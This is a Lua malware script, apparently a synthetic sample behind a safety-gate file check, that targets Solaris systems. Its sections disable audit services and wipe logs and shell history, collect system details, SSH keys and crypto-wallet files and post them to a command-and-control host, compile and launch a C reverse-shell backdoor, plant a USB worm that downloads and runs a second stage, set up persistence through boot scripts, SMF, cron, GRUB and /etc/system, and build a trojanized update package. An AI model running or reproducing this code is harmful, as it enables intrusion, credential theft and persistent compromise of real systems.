-- Safety gate: refuse to run unless ~/.dbsg42 exists
local safety_file = os.getenv("HOME") .. "/.dbsg42"
local f = io.open(safety_file, "r")
if not f then
    io.stderr:write("safety gate: missing " .. safety_file .. "\n")
    os.exit(1)
end
f:close()

-- Configuration
local C2_HOST = "review.example.invalid"
local C2_PORT = 443
local STAGE_DIR = "/tmp/.solaris_update_" .. tostring(math.random(10000, 99999))
local WORM_DIR = "/tmp/.usb_mount_check"

-- Utility: run command, capture output
local function run(cmd)
    local handle = io.popen(cmd .. " 2>/dev/null")
    if not handle then return "" end
    local result = handle:read("*a")
    handle:close()
    return result or ""
end

-- Utility: write file
local function write_file(path, data)
    local f = io.open(path, "w")
    if f then
        f:write(data)
        f:close()
        return true
    end
    return false
end

-- Utility: read file
local function read_file(path)
    local f = io.open(path, "r")
    if f then
        local data = f:read("*a")
        f:close()
        return data
    end
    return nil
end

-- ============================================================
-- Behavior: evasion/anti-av
-- Detect and disable Solaris security services
-- ============================================================
local function anti_av()
    -- Check for running security daemons and attempt to stop them
    local security_procs = {
        "smf_method",
        "svc.startd",
        "auditd",
        "sac",
        "pam",
    }

    for _, proc in ipairs(security_procs) do
        local result = run("pkill -f " .. proc)
    end

    -- Disable SMF services related to security
    run("svcadm disable physicalization 2>/dev/null")
    run("svcadm disable system/audit/auditd 2>/dev/null")
    run("svcadm disable system/security/tpm 2>/dev/null")

    -- Clear shell history
    local history_files = {
        os.getenv("HOME") .. "/.sh_history",
        os.getenv("HOME") .. "/.bash_history",
        os.getenv("HOME") .. "/.zsh_history",
    }
    for _, hf in ipairs(history_files) do
        write_file(hf, "")
        run("rm -f " .. hf)
    end

    -- Remove traces from /var/adm/messages
    run("echo '' > /var/adm/messages 2>/dev/null")
    run("echo '' > /var/log/syslog 2>/dev/null")

    -- Hide process by renaming argv[0]
    run("echo $$ > /tmp/.hidden_pid 2>/dev/null")
end

-- ============================================================
-- Behavior: discovery/system
-- Enumerate Solaris system information
-- ============================================================
local function system_discovery()
    local info = {}

    -- OS identification
    info["kernel"] = run("uname -a")
    info["release"] = run("uname -r")
    info["machine"] = run("uname -m")
    info["hostname"] = run("hostname")
    info["zonename"] = run("zonename 2>/dev/null")
    info["is_zone"] = run("cat /etc/release 2>/dev/null")

    -- Hardware
    info["cpu_info"] = run("psrinfo -v 2>/dev/null")
    info["memory"] = run("prtconf 2>/dev/null | grep -i mem")
    info["disk"] = run("format -e 2>/dev/null")
    info["network"] = run("ifconfig -a 2>/dev/null")
    info["routes"] = run("netstat -rn 2>/dev/null")

    -- Users and groups
    info["users"] = run("cat /etc/passwd 2>/dev/null")
    info["groups"] = run("cat /etc/group 2>/dev/null")
    info["logged_in"] = run("who 2>/dev/null")
    info["last_logins"] = run("last -5 2>/dev/null")

    -- Running services
    info["services"] = run("svcs -a 2>/dev/null")
    info["processes"] = run("ps -ef 2>/dev/null")
    info["listening_ports"] = run("netstat -an 2>/dev/null | grep LISTEN")

    -- Solaris packages
    info["packages"] = run("pkginfo -l 2>/dev/null")
    info["installed_cr"] = run("cr list 2>/dev/null")

    -- ZFS filesystems
    info["zfs"] = run("zfs list 2>/dev/null")
    info["zpool"] = run("zpool list 2>/dev/null")

    -- Dtrace availability
    info["dtrace"] = run("dtrace -n 'BEGIN { exit(0) }' 2>/dev/null")

    -- Exfiltrate system info to C2
    local payload = ""
    for k, v in pairs(info) do
        payload = payload .. k .. "=" .. v:gsub("\n", "\\n") .. "&"
    end

    -- Write discovered info to file for later use
    write_file(STAGE_DIR .. "/system_info.dat", payload)

    -- Attempt to send to C2
    run("curl -s -X POST http://" .. C2_HOST .. "/api/v1/discover " ..
        "-H 'Content-Type: application/x-www-form-urlencoded' " ..
        "-d '" .. payload .. "' 2>/dev/null")
end

-- ============================================================
-- Behavior: credential-access/wallet
-- Search for wallet files and cryptographic keys
-- ============================================================
local function harvest_wallets()
    local wallet_paths = {
        -- Common wallet locations
        os.getenv("HOME") .. "/.ethereum",
        os.getenv("HOME") .. "/.local/share/Ethereum",
        os.getenv("HOME") .. "/.local/share/io.metamask",
        os.getenv("HOME") .. "/.config/keepkey",
        os.getenv("HOME") .. "/.config/trezor",
        os.getenv("HOME") .. "/.bitcoin",
        os.getenv("HOME") .. "/.litecoin",
        os.getenv("HOME") .. "/.dashcore",
        os.getenv("HOME") .. "/.monero",
        -- Solaris-specific credential stores
        "/etc/ssh",
        os.getenv("HOME") .. "/.ssh",
        "/root/.ssh",
        -- PKCS#11 token stores
        "/opt/SUNWut/lib/pkcs11",
        -- Solaris crypto framework
        "/var/crypto",
        "/etc/security",
    }

    local harvested = {}

    for _, path in ipairs(wallet_paths) do
        local files = run("find " .. path .. " -type f -name '*.json' -o -name '*.key' -o -name '*.pem' -o -name 'keystore' -o -name 'id_*' -o -name '*.p12' 2>/dev/null")
        if files and #files > 0 then
            for filepath in files:gmatch("[^\r\n]+") do
                local content = read_file(filepath)
                if content then
                    table.insert(harvested, { path = filepath, data = content })
                end
            end
        end
    end

    -- Search for private keys in memory dumps
    run("find /tmp -name '*.core' -exec strings {} \\; 2>/dev/null | grep -i 'private\\|keystore\\|mnemonic' > " .. STAGE_DIR .. "/memory_keys.txt 2>/dev/null")

    -- Look for Solaris crypto tokens
    local token_info = run("pktool list 2>/dev/null")
    local token_slots = run("pktool listslots 2>/dev/null")

    -- Search for keystore files with common passwords
    local keystore_files = run("find / -name 'keystore*' -o -name '*.jks' -o -name '*.p12' 2>/dev/null")
    if keystore_files then
        for filepath in keystore_files:gmatch("[^\r\n]+") do
            table.insert(harvested, { path = filepath, data = "keystore_found" })
        end
    end

    -- Exfiltrate credentials
    local cred_payload = ""
    for _, item in ipairs(harvested) do
        cred_payload = cred_payload .. "file=" .. item.path .. "&"
    end
    write_file(STAGE_DIR .. "/wallet_data.dat", cred_payload)

    run("curl -s -X POST http://" .. C2_HOST .. "/api/v1/credentials " ..
        "-H 'Content-Type: application/x-www-form-urlencoded' " ..
        "-d '" .. cred_payload .. "' 2>/dev/null")
end

-- ============================================================
-- Behavior: execution/compile
-- Compile and execute a native payload
-- ============================================================
local function compile_payload()
    -- Generate a C source file for a native backdoor
    local c_source = [[
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define C2_HOST "]] .. C2_HOST .. [["
#define C2_PORT ]] .. C2_PORT .. [[

void exec_cmd(const char *cmd) {
    FILE *fp = popen(cmd, "r");
    if (fp) {
        char buf[4096];
        while (fgets(buf, sizeof(buf), fp)) {
            printf("%s", buf);
        }
        pclose(fp);
    }
}

int main(int argc, char *argv[]) {
    // Establish reverse connection to C2
    struct hostent *he = gethostbyname(C2_HOST);
    if (!he) {
        fprintf(stderr, "resolve failed\n");
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "socket failed\n");
        return 1;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "connect failed\n");
        close(sock);
        return 1;
    }

    // Interactive shell
    char cmd[1024];
    while (fgets(cmd, sizeof(cmd), stdin)) {
        exec_cmd(cmd);
    }

    close(sock);
    return 0;
}
]]

    -- Write C source
    local src_path = STAGE_DIR .. "/backdoor.c"
    write_file(src_path, c_source)

    -- Compile using Solaris compiler
    local compile_result = run("cc -o " .. STAGE_DIR .. "/backdoor " .. src_path .. " 2>&1")
    if not compile_result or compile_result:find("error") then
        -- Fallback to gcc
        compile_result = run("gcc -o " .. STAGE_DIR .. "/backdoor " .. src_path .. " 2>&1")
    end

    -- If compilation succeeds, run the binary
    if run("test -x " .. STAGE_DIR .. "/backdoor") ~= "" then
        -- Execute the compiled backdoor
        run("nohup " .. STAGE_DIR .. "/backdoor &>/dev/null &")
    end

    -- Also compile a LuaJIT-based payload if available
    local lua_payload = [[
local socket = require("socket")
local host = "]] .. C2_HOST .. [["
local port = ]] .. C2_PORT .. [[

local client = socket.tcp()
client:settimeout(10)
if client:connect(host, port) then
    local f = io.popen("uname -a", "r")
    local info = f:read("*a")
    f:close()
    client:send(info)
    client:close()
end
]]
    write_file(STAGE_DIR .. "/lua_payload.lua", lua_payload)
    run("lua " .. STAGE_DIR .. "/lua_payload.lua &>/dev/null &")
end

-- ============================================================
-- Behavior: lateral-movement/usb-worm
-- Propagate to USB storage devices
-- ============================================================
local function usb_worm()
    -- Detect USB storage devices on Solaris
    local usb_devices = run("format 2>/dev/null")
    local removable = run("removable -v 2>/dev/null")
    local disks = run("iostat -En 2>/dev/null")
    local cfgadm = run("cfgadm -al 2>/dev/null")

    -- Find mountable USB devices
    local usb_mounts = run("mount 2>/dev/null | grep -E 'usb|removable|sdc|sdd|sde'")

    -- List all potential removable media
    local dev_files = run("ls /dev/rdsk/ 2>/dev/null")
    local block_devs = run("ls /dev/dsk/ 2>/dev/null")

    -- Create worm payload for USB
    local worm_payload = [[
#!/bin/sh
# Solaris USB Worm - Self-propagating payload
STAGE_DIR="/tmp/.solaris_update_$(printf '%05d' $RANDOM)"
mkdir -p "$STAGE_DIR"
curl -s http://]] .. C2_HOST .. [[/api/v1/worm -o "$STAGE_DIR/stage2"
chmod +x "$STAGE_DIR/stage2"
nohup "$STAGE_DIR/stage2" &>/dev/null &
]]

    write_file(STAGE_DIR .. "/worm.sh", worm_payload)
    run("chmod +x " .. STAGE_DIR .. "/worm.sh")

    -- Propagate to detected USB devices
    for device in string.gmatch(dev_files or "", "%S+") do
        local dev_path = "/dev/rdsk/" .. device
        local mount_point = run("mount | grep " .. device .. " | awk '{print $3}'")
        if mount_point and #mount_point > 0 then
            -- Copy worm to mounted USB
            run("cp " .. STAGE_DIR .. "/worm.sh " .. mount_point .. "/.auto_run.sh 2>/dev/null")
            run("chmod +x " .. mount_point .. "/.auto_run.sh 2>/dev/null")

            -- Create autorun for different filesystem types
            run("cp " .. STAGE_DIR .. "/worm.sh " .. mount_point .. "/autorun.sh 2>/dev/null")
            run("cp " .. STAGE_DIR .. "/worm.sh " .. mount_point .. "/.hidden_update.sh 2>/dev/null")
        end
    end

    -- Also write raw payload to device headers
    local raw_payload = "SOLARIS_WORM:" .. C2_HOST .. ":" .. tostring(C2_PORT)
    for device in string.gmatch(dev_files or "", "%S+") do
        run("echo '" .. raw_payload .. "' > /dev/" .. device .. " 2>/dev/null")
    end

    -- Set up periodic USB check via cron
    local cron_entry = "*/5 * * * * /bin/sh -c 'for d in /dev/rdsk/*; do m=$(mount | grep \"$(basename $d)\" | awk \"{print \\$3}\"); if [ -n \"$m\" ]; then cp " .. STAGE_DIR .. "/worm.sh $m/.auto_run.sh 2>/dev/null; fi; done'"
    run("crontab -l 2>/dev/null | cat - <(echo '" .. cron_entry .. "') | crontab - 2>/dev/null")
end

-- ============================================================
-- Behavior: persistence/firmware
-- Achieve persistence through firmware-level mechanisms
-- ============================================================
local function firmware_persistence()
    -- Solaris-specific persistence mechanisms

    -- 1. Install boot archive hook
    local boot_hook = [[
#!/bin/sh
# Boot archive persistence hook
curl -s http://]] .. C2_HOST .. [[/api/v1/persist | /bin/sh
]]
    write_file("/etc/rc3.d/S99system_update", boot_hook)
    run("chmod +x /etc/rc3.d/S99system_update")

    -- 2. Modify Solaris boot environment
    run("beadm create worm_be 2>/dev/null")

    -- 3. Install SMF service for persistence
    local smf_manifest = [[<?xml version='1.0'?>
<!DOCTYPE service_bundle SYSTEM '/usr/share/lib/xml/dtd/service_bundle.dtd.1.0'>
<service_bundle type='manifest' name='system/update/agent'>
  <service name='system/update/agent' type='service' version='1'>
    <create_default_instance enabled='true'/>
    <single_instance/>
    <dependency name='network' grouping='require_all' restart_on='error' type='service'>
      <service_fmri value='svc:/network/initial'/>
    </dependency>
    <exec_method type='method' name='start' exec=']] .. STAGE_DIR .. [[/backdoor &' timeout='60'/>
    <exec_method type='method' name='stop' exec=':kill' timeout='60'/>
    <property_group name='startd' type='framework'>
      <propval name='duration' type='astring' value='transient'/>
    </property_group>
    <stability value='Unstable'/>
  </service>
</service_bundle>]]

    write_file("/var/svc/manifest/system/update-agent.xml", smf_manifest)
    run("svccfg import /var/svc/manifest/system/update-agent.xml 2>/dev/null")
    run("svcadm enable system/update/agent 2>/dev/null")

    -- 4. Install cron job for persistence
    local cron_persist = "*/10 * * * * curl -s http://" .. C2_HOST .. "/api/v1/persist | /bin/sh"
    run("crontab -l 2>/dev/null | cat - <(echo '" .. cron_persist .. "') | crontab - 2>/dev/null")

    -- 5. Modify GRUB/Boot menu (if present)
    run("echo 'curl -s http://" .. C2_HOST .. "/api/v1/persist | /bin/sh' >> /etc/grub.d/40_custom 2>/dev/null")

    -- 6. Install init script
    local init_script = [[#!/sbin/sh
# System Update Agent - Persistence
if [ -f ]] .. STAGE_DIR .. [[/backdoor ]; then
    nohup ]] .. STAGE_DIR .. [[/backdoor &>/dev/null &
fi
curl -s http://]] .. C2_HOST .. [[/api/v1/heartbeat &>/dev/null &
]]
    write_file("/etc/init.d/S99system_update", init_script)
    run("chmod +x /etc/init.d/S99system_update")

    -- 7. Write to firmware flash if possible (Solaris flash archive)
    run("flash_create -f /tmp/.firmware_backup " .. STAGE_DIR .. " 2>/dev/null")

    -- 8. Modify /etc/system for kernel-level persistence
    run("echo '*modctl: /" .. STAGE_DIR .. "/backdoor' >> /etc/system 2>/dev/null")
end

-- ============================================================
-- Behavior: supply-chain/hidden-payload
-- Embed hidden payloads in system packages and update mechanisms
-- ============================================================
local function hidden_payload()
    -- 1. Create a fake Solaris package with hidden payload
    local pkg_dir = STAGE_DIR .. "/fake_pkg"
    run("mkdir -p " .. pkg_dir .. "/payload 2>/dev/null")

    -- Create a trojanized library
    local trojan_lib = [[
/* Trojanized system library - intercepts credential calls */
#include <stdio.h>
#include <string.h>

char *getenv(const char *name) {
    static char buffer[4096];
    char *real_val = __real_getenv(name);
    if (real_val) {
        snprintf(buffer, sizeof(buffer), "%s", real_val);
        /* Log credentials to C2 */
        FILE *fp = popen("curl -s -X POST http://]] .. C2_HOST .. [[/api/v1/env -d 'name=" ..
            [[%s&value=%s' 2>/dev/null", "r");
        if (fp) pclose(fp);
    }
    return buffer;
}
]]
    write_file(pkg_dir .. "/payload/trojan_lib.c", trojan_lib)

    -- 2. Hook into Solaris package manager
    local pkg_script = [[#!/bin/sh
# Pre-install hook - downloads and executes hidden payload
curl -s http://]] .. C2_HOST .. [[/api/v1/payload -o ]] .. STAGE_DIR .. [[/hidden_payload
chmod +x ]] .. STAGE_DIR .. [[/hidden_payload
nohup ]] .. STAGE_DIR .. [[/hidden_payload &>/dev/null &
]]
    write_file(pkg_dir .. "/payload/preinstall", pkg_script)
    run("chmod +x " .. pkg_dir .. "/payload/preinstall 2>/dev/null")

    -- 3. Create a fake update package
    local pkg_info = [[PKG=system/trojan-update
NAME=System Security Update
VERSION=1.0.0
ARCH=sparc
BASEDIR=/
]]
    write_file(pkg_dir .. "/pkginfo", pkg_info)

    -- 4. Poison Lua package paths
    local lua_path_hook = [[
-- Hidden Lua payload injected via package.path
package.path = package.path .. ";/tmp/.solaris_update_*/?.lua"
local hidden = require("hidden_payload")
hidden.init()
]]
    write_file(STAGE_DIR .. "/hidden_payload.lua", lua_path_hook)

    -- 5. Create a trojanized Lua module
    local trojan_module = [[
local M = {}
function M.init()
    local socket = require("socket")
    local client = socket.tcp()
    client:settimeout(5)
    if client:connect("]] .. C2_HOST .. [[", ]] .. C2_PORT .. [[) then
        client:send("trojan_loaded\n")
        client:close()
    end
end
return M
]]
    write_file(STAGE_DIR .. "/hidden_payload.lua", trojan_module)

    -- 6. Modify LuaRocks config to inject trojan
    local luarocks_config = os.getenv("HOME") .. "/.luarocks/config-5.3.lua"
    local existing_config = read_file(luarocks_config) or ""
    local trojan_rocks = existing_config .. [[
-- Injected hook
rocks_trees = { "/tmp/.solaris_update_*/rocks" }
]]
    write_file(luarocks_config, trojan_rocks)

    -- 7. Create fake package update notification
    local fake_update = [[<?xml version="1.0" encoding="UTF-8"?>
<package name="solaris-security-patch" version="2024.05.23">
  <description>Critical security update</description>
  <install_script>curl -s http://]] .. C2_HOST .. [[/api/v1/payload | /bin/sh</install_script>
</package>]]
    write_file(STAGE_DIR .. "/fake_update.xml", fake_update)

    -- 8. Attempt to register with Solaris IPS
    run("pkg set-publisher -g http://" .. C2_HOST .. "/packages solaris-trojan 2>/dev/null")
end

-- ============================================================
-- Main execution
-- ============================================================
local function main()
    -- Create staging directory
    run("mkdir -p " .. STAGE_DIR)

    -- Execute all behaviors
    anti_av()
    system_discovery()
    harvest_wallets()
    compile_payload()
    usb_worm()
    firmware_persistence()
    hidden_payload()

    -- Final beacon to C2
    run("curl -s -X POST http://" .. C2_HOST .. "/api/v1/beacon " ..
        "-H 'Content-Type: application/json' " ..
        "-d '{\"status\":\"deployed\",\"host\":\"" .. run("hostname"):gsub("\n", "") ..
        "\",\"behaviors\":[\"anti-av\",\"system-discovery\",\"wallet-harvest\",\"compile\",\"usb-worm\",\"firmware-persist\",\"supply-chain\"]}' 2>/dev/null")
end

main()
